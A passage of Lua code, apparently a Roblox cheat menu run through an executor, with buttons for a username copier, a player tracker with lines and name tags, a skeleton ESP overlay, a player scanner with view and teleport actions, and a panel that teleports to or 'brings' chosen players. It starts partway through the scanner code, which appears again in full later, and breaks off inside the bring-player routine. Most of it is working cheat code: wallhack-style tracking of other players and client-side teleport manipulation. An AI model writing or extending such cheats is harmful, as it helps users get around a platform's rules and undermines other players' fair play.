		Btn.AutoButtonColor = false
		Btn.Parent = ActionsFrame

		local BtnCorner = Instance.new("UICorner")
		BtnCorner.CornerRadius = UDim.new(0, 6)
		BtnCorner.Parent = Btn

		AddHoverEffect(Btn)
		return Btn
	end

	local ViewBtn = CreateActionButton("VIEW")
	local UnviewBtn = CreateActionButton("UNVIEW")
	local TeleportBtn = CreateActionButton("TELEPORT")

	ViewBtn.Position = UDim2.new(0, 0, 0, 0)
	UnviewBtn.Position = UDim2.new(0.35, 0, 0, 0)
	TeleportBtn.Position = UDim2.new(0.7, 0, 0, 0)

	-- === BUTTON FUNCTIONS ===
	ViewBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("Head") then
			workspace.CurrentCamera.CameraSubject = player.Character:FindFirstChild("Head")
		end
	end)

	UnviewBtn.MouseButton1Click:Connect(function()
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
			workspace.CurrentCamera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
		end
	end)

	TeleportBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
		   LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			LocalPlayer.Character.HumanoidRootPart.CFrame =
				player.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 0)
		end
	end)

	-- Show/hide action buttons
	PlayerButton.MouseButton1Click:Connect(function()
		ActionsFrame.Visible = not ActionsFrame.Visible
	end)
end

-- SCAN function
ScanButton.MouseButton1Click:Connect(function()
	for _, child in ipairs(PlayerListFrame:GetChildren()) do
		if child:IsA("TextButton") or child:IsA("Frame") then
			child:Destroy()
		end
	end

	task.spawn(function()
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer then
				CreatePlayerButton(player)
				task.wait(0.15)
			end
		end
	end)
end)

-- Hide/Unhide with U
UIS.InputBegan:Connect(function(input, gp)
	if not gp and input.KeyCode == Enum.KeyCode.U then
		MainFrame.Visible = not MainFrame.Visible
	end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("USERNAME COPIER [3KTG]", function()
	-- Sleek Black Player Scanner GUI (Medium Version with Smooth Refresh Animation)
-- All-black draggable GUI listing player usernames. Click to copy username.
-- Use 'M' key to toggle visibility.

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PlayerScannerGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Main frame (medium black window)
local mainFrame = Instance.new("Frame")
mainFrame.Name = "Main"
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.Size = UDim2.new(0, 300, 0, 340)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui
mainFrame.Active = true
mainFrame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = mainFrame

-- Title
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 34)
title.BackgroundTransparency = 1
title.Text = "USERNAME COPIER"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = mainFrame

-- Close button
local closeBtn = Instance.new("TextButton")
closeBtn.Name = "Close"
closeBtn.Size = UDim2.new(0, 26, 0, 26)
closeBtn.Position = UDim2.new(1, -32, 0, 4)
closeBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
closeBtn.BorderSizePixel = 0
closeBtn.Text = "‚úï"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 16
closeBtn.Parent = mainFrame
closeBtn.MouseButton1Click:Connect(function()
	screenGui.Enabled = false
end)

-- Refresh Button
local refreshBtn = Instance.new("TextButton")
refreshBtn.Name = "Refresh"
refreshBtn.Size = UDim2.new(0, 100, 0, 28)
refreshBtn.Position = UDim2.new(0, 8, 0, 40)
refreshBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
refreshBtn.BorderSizePixel = 1
refreshBtn.BorderColor3 = Color3.fromRGB(25, 25, 25)
refreshBtn.Text = "REFRESH"
refreshBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
refreshBtn.Font = Enum.Font.GothamBold
refreshBtn.TextSize = 13
refreshBtn.Parent = mainFrame

local refreshCorner = Instance.new("UICorner")
refreshCorner.CornerRadius = UDim.new(0, 6)
refreshCorner.Parent = refreshBtn

-- Scrolling player list
local scroll = Instance.new("ScrollingFrame")
scroll.Name = "PlayerList"
scroll.Position = UDim2.new(0, 8, 0, 74)
scroll.Size = UDim2.new(1, -16, 1, -82)
scroll.BackgroundTransparency = 1
scroll.BorderSizePixel = 0
scroll.ScrollBarThickness = 4
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
scroll.Parent = mainFrame

local uiList = Instance.new("UIListLayout")
uiList.Padding = UDim.new(0, 5)
uiList.SortOrder = Enum.SortOrder.LayoutOrder
uiList.Parent = scroll

local uiPadding = Instance.new("UIPadding")
uiPadding.PaddingTop = UDim.new(0, 6)
uiPadding.PaddingLeft = UDim.new(0, 6)
uiPadding.PaddingRight = UDim.new(0, 6)
uiPadding.PaddingBottom = UDim.new(0, 6)
uiPadding.Parent = scroll

-- Notification helper
local function notify(titleText, text)
	pcall(function()
		StarterGui:SetCore("SendNotification", {
			Title = titleText or "Notice",
			Text = text or "",
			Duration = 2
		})
	end)
end

-- Create player button
local function makePlayerButton(plr)
	local btn = Instance.new("TextButton")
	btn.Name = plr.Name
	btn.Size = UDim2.new(1, -4, 0, 28)
	btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	btn.BorderSizePixel = 1
	btn.BorderColor3 = Color3.fromRGB(25, 25, 25)
	btn.Text = plr.Name
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 15
	btn.BackgroundTransparency = 1
	btn.TextTransparency = 1
	btn.Parent = scroll

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 6)
	corner.Parent = btn

	TweenService:Create(btn, TweenInfo.new(0.25), {BackgroundTransparency = 0, TextTransparency = 0}):Play()

	btn.MouseButton1Click:Connect(function()
		local username = plr.Name
		local success, err = pcall(function()
			if setclipboard then
				setclipboard(username)
				notify("Copied", username .. " copied!")
			else
				error("no setclipboard")
			end
		end)
		if not success then
			notify("Manual Copy", username .. " (setclipboard not supported)")
		end
	end)
end

-- Smooth refresh with fade effect
local function refreshList()
	-- Fade out existing buttons
	for _, child in ipairs(scroll:GetChildren()) do
		if child:IsA("TextButton") then
			TweenService:Create(child, TweenInfo.new(0.15), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
		end
	end
	task.wait(0.15)

	-- Clear old buttons
	for _, child in ipairs(scroll:GetChildren()) do
		if child:IsA("TextButton") then child:Destroy() end
	end

	-- Add new player buttons
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then
			makePlayerButton(plr)
		end
	end

	local total = #Players:GetPlayers() * 32
	scroll.CanvasSize = UDim2.new(0, 0, 0, total)
	notify("Refreshed", "Player list updated")
end

refreshBtn.MouseButton1Click:Connect(refreshList)
Players.PlayerAdded:Connect(refreshList)
Players.PlayerRemoving:Connect(refreshList)
refreshList()

-- Toggle with M key
local UIS = game:GetService("UserInputService")
UIS.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == Enum.KeyCode.M then
		screenGui.Enabled = not screenGui.Enabled
	end
end)

screenGui.Enabled = true
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("TRACK ALL MUSCLE T TO OPEN / OFF [3KTG]", function()
   --// Player Tracker + NameTag Display | Toggle with T key (FINAL FIXED VERSION)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

repeat wait() until LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

local trackingEnabled = false
local lines = {}
local nameTags = {}
local connections = {}
local renderConnection

-- Clean ESP for a single player
local function removeESP(player)
	if lines[player] then
		lines[player]:Destroy()
		lines[player] = nil
	end
	if nameTags[player] then
		nameTags[player]:Destroy()
		nameTags[player] = nil
	end
end

-- Create ESP for a player
local function createESP(player)
	if player == LocalPlayer then return end

	local function setup()
		removeESP(player)

		local character = player.Character
		if not character then return end

		local hrp = character:FindFirstChild("HumanoidRootPart")
		local head = character:FindFirstChild("Head")
		if not hrp or not head then return end

		-- Line
		local line = Instance.new("Part")
		line.Anchored = true
		line.CanCollide = false
		line.Color = Color3.new(1, 1, 1)
		line.Material = Enum.Material.Neon
		line.Transparency = 0
		line.Size = Vector3.new(0.1, 0.1, 1)
		line.Name = "ESP_Line_" .. player.Name
		line.Parent = workspace
		lines[player] = line

		-- NameTag
		local billboard = Instance.new("BillboardGui")
		billboard.Name = "NameTag"
		billboard.Size = UDim2.new(0, 100, 0, 30)
		billboard.StudsOffset = Vector3.new(0, 2.2, 0)
		billboard.AlwaysOnTop = true
		billboard.Adornee = head

		local textLabel = Instance.new("TextLabel")
		textLabel.Size = UDim2.new(1, 0, 1, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = player.DisplayName .. "\n(" .. player.Name .. ")"
		textLabel.TextColor3 = Color3.new(1, 1, 1)
		textLabel.TextStrokeTransparency = 0.4
		textLabel.Font = Enum.Font.SourceSansBold
		textLabel.TextScaled = true
		textLabel.Parent = billboard

		billboard.Parent = head
		nameTags[player] = billboard
	end

	if player.Character then
		setup()
	end

	local conn = player.CharacterAdded:Connect(function()
		wait(1)
		setup()
	end)
	table.insert(connections, conn)
end

-- Update all lines every frame
local function updateESP()
	local origin = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not origin then return end

	for player, line in pairs(lines) do
		local target = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
		if target and target:IsDescendantOf(workspace) then
			local direction = target.Position - origin.Position
			local distance = direction.Magnitude
			line.Size = Vector3.new(0.1, 0.1, distance)
			line.CFrame = CFrame.new(origin.Position, target.Position) * CFrame.new(0, 0, -distance / 2)
		else
			-- Remove broken line
			removeESP(player)
		end
	end
end

-- Clear everything
local function clearESP()
	for _, line in pairs(lines) do
		if line then line:Destroy() end
	end
	for _, tag in pairs(nameTags) do
		if tag then tag:Destroy() end
	end
	for _, conn in ipairs(connections) do
		if conn then conn:Disconnect() end
	end
	if renderConnection then
		renderConnection:Disconnect()
	end

	lines = {}
	nameTags = {}
	connections = {}
	renderConnection = nil
end

-- Toggle ESP
local function toggleESP()
	trackingEnabled = not trackingEnabled

	if trackingEnabled then
		warn("üì° ESP ON")

		for _, player in ipairs(Players:GetPlayers()) do
			createESP(player)
		end

		local playerAddedConn = Players.PlayerAdded:Connect(function(player)
			createESP(player)
		end)
		table.insert(connections, playerAddedConn)

		renderConnection = RunService.RenderStepped:Connect(updateESP)
	else
		warn("üì¥ ESP OFF")
		clearESP()
	end
end

-- Keybind (T)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.T then
		toggleESP()
	end
end)

warn("üîÅ Press [T] to toggle Player Tracker with Clean ESP.")
end)

addMainMenuButton("ESP [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "ESP_Toggle_GUI"
gui.ResetOnSpawn = false
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0, 100, 0, 35)
toggleButton.Position = UDim2.new(0, 20, 0, 120)
toggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleButton.Text = "ESP: ON"
toggleButton.Font = Enum.Font.GothamBold
toggleButton.TextSize = 14
toggleButton.Parent = gui

local corner = Instance.new("UICorner", toggleButton)
corner.CornerRadius = UDim.new(0, 6)

--// Toggle State
local ESP_ENABLED = true
local ESPObjects = {}

--// Drawing Helpers
local function newLine()
	local line = Drawing.new("Line")
	line.Thickness = 2
	line.Color = Color3.fromRGB(255, 255, 255) -- Changed to white
	line.Visible = true
	return line
end

local function newText()
	local text = Drawing.new("Text")
	text.Size = 14
	text.Color = Color3.fromRGB(255, 255, 255)
	text.Center = true
	text.Outline = true
	text.Visible = true
	return text
end

local function clearESP(player)
	if ESPObjects[player] then
		for _, obj in pairs(ESPObjects[player]) do
			if obj.Remove then obj:Remove() end
		end
		ESPObjects[player] = nil
	end
end

--// Get 2D screen position of 3D part
local function getPartPos(part)
	if not part then return nil, false end
	local pos, visible = Camera:WorldToViewportPoint(part.Position)
	return Vector2.new(pos.X, pos.Y), visible
end

--// ESP Rendering
RunService.RenderStepped:Connect(function()
	if not ESP_ENABLED then
		for _, v in pairs(ESPObjects) do
			for _, obj in pairs(v) do
				obj.Visible = false
			end
		end
		return
	end

	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and player.Character then
			local char = player.Character
			local esp = ESPObjects[player]

			if not esp then
				esp = {
					HeadToTorso = newLine(),
					TorsoToLeftArm = newLine(),
					TorsoToRightArm = newLine(),
					TorsoToLeftLeg = newLine(),
					TorsoToRightLeg = newLine(),
					Name = newText(),
				}
				ESPObjects[player] = esp
			end

			local headPos, headVis = getPartPos(char:FindFirstChild("Head"))
			local torsoPos, torsoVis = getPartPos(char:FindFirstChild("HumanoidRootPart"))
			local laPos, laVis = getPartPos(char:FindFirstChild("LeftUpperArm") or char:FindFirstChild("Left Arm"))
			local raPos, raVis = getPartPos(char:FindFirstChild("RightUpperArm") or char:FindFirstChild("Right Arm"))
			local llPos, llVis = getPartPos(char:FindFirstChild("LeftUpperLeg") or char:FindFirstChild("Left Leg"))
			local rlPos, rlVis = getPartPos(char:FindFirstChild("RightUpperLeg") or char:FindFirstChild("Right Leg"))

			if headVis and torsoVis then
				esp.HeadToTorso.From = headPos
				esp.HeadToTorso.To = torsoPos
				esp.HeadToTorso.Visible = true
			else
				esp.HeadToTorso.Visible = false
			end

			if torsoVis and laVis then
				esp.TorsoToLeftArm.From = torsoPos
				esp.TorsoToLeftArm.To = laPos
				esp.TorsoToLeftArm.Visible = true
			else
				esp.TorsoToLeftArm.Visible = false
			end

			if torsoVis and raVis then
				esp.TorsoToRightArm.From = torsoPos
				esp.TorsoToRightArm.To = raPos
				esp.TorsoToRightArm.Visible = true
			else
				esp.TorsoToRightArm.Visible = false
			end

			if torsoVis and llVis then
				esp.TorsoToLeftLeg.From = torsoPos
				esp.TorsoToLeftLeg.To = llPos
				esp.TorsoToLeftLeg.Visible = true
			else
				esp.TorsoToLeftLeg.Visible = false
			end

			if torsoVis and rlVis then
				esp.TorsoToRightLeg.From = torsoPos
				esp.TorsoToRightLeg.To = rlPos
				esp.TorsoToRightLeg.Visible = true
			else
				esp.TorsoToRightLeg.Visible = false
			end

			if headVis then
				esp.Name.Position = Vector2.new(headPos.X, headPos.Y - 20)
				esp.Name.Text = player.Name
				esp.Name.Visible = true
			else
				esp.Name.Visible = false
			end
		end
	end
end)

--// Player leave cleanup
Players.PlayerRemoving:Connect(function(player)
	clearESP(player)
end)

--// Toggle Button
toggleButton.MouseButton1Click:Connect(function()
	ESP_ENABLED = not ESP_ENABLED
	toggleButton.Text = ESP_ENABLED and "ESP: ON" or "ESP: OFF"
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PLAYER SCANNER [3KTG]", function()
	--// TAONG GOMA PLAYER SCANNER
-- Solid black GUI + Modern font + Hover effects + Click animations + Working VIEW/UNVIEW/TELEPORT

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UIS = game:GetService("UserInputService")

-- Main ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 400)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BorderSizePixel = 0
MainFrame.Visible = true
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

-- UI Corner
local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = MainFrame

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "TAONG GOMA PLAYER SCANNER"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.Parent = MainFrame

-- Scan Button
local ScanButton = Instance.new("TextButton")
ScanButton.Size = UDim2.new(0.9, 0, 0, 35)
ScanButton.Position = UDim2.new(0.05, 0, 0, 50)
ScanButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanButton.Font = Enum.Font.GothamBold
ScanButton.TextSize = 18
ScanButton.Text = "SCAN"
ScanButton.AutoButtonColor = false
ScanButton.Parent = MainFrame

local ScanCorner = Instance.new("UICorner")
ScanCorner.CornerRadius = UDim.new(0, 6)
ScanCorner.Parent = ScanButton

-- Hover effect
local function AddHoverEffect(button)
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	end)
	button.MouseButton1Click:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		task.wait(0.1)
		button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	end)
end
AddHoverEffect(ScanButton)

-- Scrollable Player List
local PlayerListFrame = Instance.new("ScrollingFrame")
PlayerListFrame.Size = UDim2.new(0.9, 0, 0, 280)
PlayerListFrame.Position = UDim2.new(0.05, 0, 0, 90)
PlayerListFrame.BackgroundTransparency = 1
PlayerListFrame.BorderSizePixel = 0
PlayerListFrame.ScrollBarThickness = 6
PlayerListFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
PlayerListFrame.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = PlayerListFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 4)

-- Function to create each player entry
local function CreatePlayerButton(player)
	local PlayerButton = Instance.new("TextButton")
	PlayerButton.Size = UDim2.new(1, 0, 0, 30)
	PlayerButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	PlayerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	PlayerButton.Font = Enum.Font.Gotham
	PlayerButton.TextSize = 16
	PlayerButton.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	PlayerButton.AutoButtonColor = false
	PlayerButton.Parent = PlayerListFrame

	local PlayerCorner = Instance.new("UICorner")
	PlayerCorner.CornerRadius = UDim.new(0, 6)
	PlayerCorner.Parent = PlayerButton

	AddHoverEffect(PlayerButton)

	-- Actions Frame
	local ActionsFrame = Instance.new("Frame")
	ActionsFrame.Size = UDim2.new(1, 0, 0, 30)
	ActionsFrame.BackgroundTransparency = 1
	ActionsFrame.Visible = false
	ActionsFrame.Parent = PlayerListFrame

	local function CreateActionButton(text)
		local Btn = Instance.new("TextButton")
		Btn.Size = UDim2.new(0.3, 0, 1, 0)
		Btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
		Btn.Font = Enum.Font.GothamBold
		Btn.TextSize = 14
		Btn.Text = text
		Btn.AutoButtonColor = false
		Btn.Parent = ActionsFrame

		local BtnCorner = Instance.new("UICorner")
		BtnCorner.CornerRadius = UDim.new(0, 6)
		BtnCorner.Parent = Btn

		AddHoverEffect(Btn)
		return Btn
	end

	local ViewBtn = CreateActionButton("VIEW")
	local UnviewBtn = CreateActionButton("UNVIEW")
	local TeleportBtn = CreateActionButton("TELEPORT")

	ViewBtn.Position = UDim2.new(0, 0, 0, 0)
	UnviewBtn.Position = UDim2.new(0.35, 0, 0, 0)
	TeleportBtn.Position = UDim2.new(0.7, 0, 0, 0)

	-- === BUTTON FUNCTIONS ===
	ViewBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("Head") then
			workspace.CurrentCamera.CameraSubject = player.Character:FindFirstChild("Head")
		end
	end)

	UnviewBtn.MouseButton1Click:Connect(function()
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
			workspace.CurrentCamera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
		end
	end)

	TeleportBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
		   LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			LocalPlayer.Character.HumanoidRootPart.CFrame =
				player.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 0)
		end
	end)

	-- Show/hide action buttons
	PlayerButton.MouseButton1Click:Connect(function()
		ActionsFrame.Visible = not ActionsFrame.Visible
	end)
end

-- SCAN function
ScanButton.MouseButton1Click:Connect(function()
	for _, child in ipairs(PlayerListFrame:GetChildren()) do
		if child:IsA("TextButton") or child:IsA("Frame") then
			child:Destroy()
		end
	end

	task.spawn(function()
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer then
				CreatePlayerButton(player)
				task.wait(0.15)
			end
		end
	end)
end)

-- Hide/Unhide with U
UIS.InputBegan:Connect(function(input, gp)
	if not gp and input.KeyCode == Enum.KeyCode.U then
		MainFrame.Visible = not MainFrame.Visible
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PLAYER LIST TP [3KTG]", function()
	-- TAONG GOMA - Player Viewer (LocalScript sa StarterGui)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- GUI parent
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "TaongGomaGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Toggle visibility keybind (K)
UserInputService.InputBegan:Connect(function(input, isProcessed)
	if not isProcessed and input.KeyCode == Enum.KeyCode.K then
		screenGui.Enabled = not screenGui.Enabled
	end
end)

-- Main draggable frame
local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 520, 0, 360)
mainFrame.Position = UDim2.new(0.5, -260, 0.5, -180)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.BorderSizePixel = 0

-- Title bar
local titleBar = Instance.new("TextLabel", mainFrame)
titleBar.Size = UDim2.new(1, 0, 0, 36)
titleBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
titleBar.Text = "TAONG GOMA"
titleBar.Font = Enum.Font.GothamBold
titleBar.TextSize = 22
titleBar.TextColor3 = Color3.fromRGB(255, 255, 255)
titleBar.BorderSizePixel = 0

-- Left: player list (scrolling)
local leftWidth = 0.34
local scroll = Instance.new("ScrollingFrame", mainFrame)
scroll.Name = "PlayerList"
scroll.Position = UDim2.new(0, 0, 0, 36)
scroll.Size = UDim2.new(leftWidth, 0, 1, -36)
scroll.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
scroll.ScrollBarThickness = 6
scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
scroll.BorderSizePixel = 0

local listLayout = Instance.new("UIListLayout", scroll)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Padding = UDim.new(0, 4)

-- Right: info + buttons
local right = Instance.new("Frame", mainFrame)
right.Position = UDim2.new(leftWidth, 0, 0, 36)
right.Size = UDim2.new(1 - leftWidth, 0, 1, -36)
right.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
right.BorderSizePixel = 0

-- Center container for Name/Health
local infoContainer = Instance.new("Frame", right)
infoContainer.Size = UDim2.new(1, 0, 0.55, 0)
infoContainer.Position = UDim2.new(0, 0, 0, 8)
infoContainer.BackgroundTransparency = 1

local nameLabel = Instance.new("TextLabel", infoContainer)
nameLabel.Size = UDim2.new(1, -20, 0, 36)
nameLabel.Position = UDim2.new(0, 10, 0, 10)
nameLabel.BackgroundTransparency = 1
nameLabel.Font = Enum.Font.GothamBold
nameLabel.TextSize = 22
nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
nameLabel.Text = "Name: None"
nameLabel.TextXAlignment = Enum.TextXAlignment.Center

local healthLabel = Instance.new("TextLabel", infoContainer)
healthLabel.Size = UDim2.new(1, -20, 0, 26)
healthLabel.Position = UDim2.new(0, 10, 0, 60)
healthLabel.BackgroundTransparency = 1
healthLabel.Font = Enum.Font.Gotham
healthLabel.TextSize = 18
healthLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
healthLabel.Text = "Health: N/A"
healthLabel.TextXAlignment = Enum.TextXAlignment.Center

-- Buttons container
local buttonContainer = Instance.new("Frame", right)
buttonContainer.Size = UDim2.new(1, 0, 0.35, 0)
buttonContainer.Position = UDim2.new(0, 0, 0.6, 0)
buttonContainer.BackgroundTransparency = 1

local padding = Instance.new("UIPadding", buttonContainer)
padding.PaddingTop = UDim.new(0, 5)
padding.PaddingBottom = UDim.new(0, 5)

local btnLayout = Instance.new("UIListLayout", buttonContainer)
btnLayout.SortOrder = Enum.SortOrder.LayoutOrder
btnLayout.Padding = UDim.new(0, 8)
btnLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
btnLayout.VerticalAlignment = Enum.VerticalAlignment.Top

-- Button creator
local function createButton(label)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0.85, 0, 0.22, 0)
	b.AnchorPoint = Vector2.new(0.5, 0)
	b.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	b.Font = Enum.Font.GothamBold
	b.TextSize = 18
	b.Text = label
	b.TextColor3 = Color3.fromRGB(255, 255, 255)
	b.AutoButtonColor = true
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 8)
	corner.Parent = b
	b.Parent = buttonContainer
	return b
end

local viewButton = createButton("View Player")
local tpButton = createButton("Teleport to Player")
local bringButton = createButton("Bring Player") -- bagong button
local friendButton = createButton("Add Friend")

-- State
local selectedPlayer = nil
local isViewing = false
local isBringing = false
local originalCameraSubject = Camera.CameraSubject
local bringConnection

-- Helper: safely revert camera
local function revertCamera()
	if originalCameraSubject and typeof(originalCameraSubject) == "Instance" and originalCameraSubject.Parent then
		Camera.CameraSubject = originalCameraSubject
	else
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
			Camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		end
	end
	Camera.CameraType = Enum.CameraType.Custom
	isViewing = false
	viewButton.Text = "View Player"
end

-- Build player list
local function refreshPlayerList()
	for _, c in ipairs(scroll:GetChildren()) do
		if c:IsA("TextButton") then c:Destroy() end
	end
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then
			local btn = Instance.new("TextButton")
			btn.Size = UDim2.new(1, -8, 0, 28)
			btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			btn.TextColor3 = Color3.fromRGB(255, 255, 255)
			btn.Font = Enum.Font.Gotham
			btn.TextSize = 16
			btn.AutoButtonColor = true
			btn.Text = plr.Name
			local corner = Instance.new("UICorner")
			corner.CornerRadius = UDim.new(0, 4)
			corner.Parent = btn
			btn.Parent = scroll
			btn.MouseButton1Click:Connect(function()
				selectedPlayer = plr
				nameLabel.Text = "Name: " .. plr.Name
				local humanoid = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					healthLabel.Text = "Health: " .. math.floor(humanoid.Health)
				else
					healthLabel.Text = "Health: N/A"
				end
				if isViewing then revertCamera() end
			end)
		end
	end
end

-- Button behaviors
viewButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	local char = selectedPlayer.Character
	local humanoid = char and char:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end
	if not isViewing then
		originalCameraSubject = Camera.CameraSubject
		Camera.CameraSubject = humanoid
		Camera.CameraType = Enum.CameraType.Custom
		isViewing = true
		viewButton.Text = "Unview Player"
	else
		revertCamera()
	end
end)

tpButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	local targetHRP = selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart")
	local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if targetHRP and myHRP then
		myHRP.CFrame = targetHRP.CFrame + Vector3.new(2, 0.5, 0)
	end
end)

bringButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	if not isBringing then
		isBringing = true
		bringButton.Text = "Unbring Player"
		bringConnection = RunService.RenderStepped:Connect(function()
			local targetChar = selectedPlayer.Character
			local myChar = LocalPlayer.Character
			if targetChar and myChar then
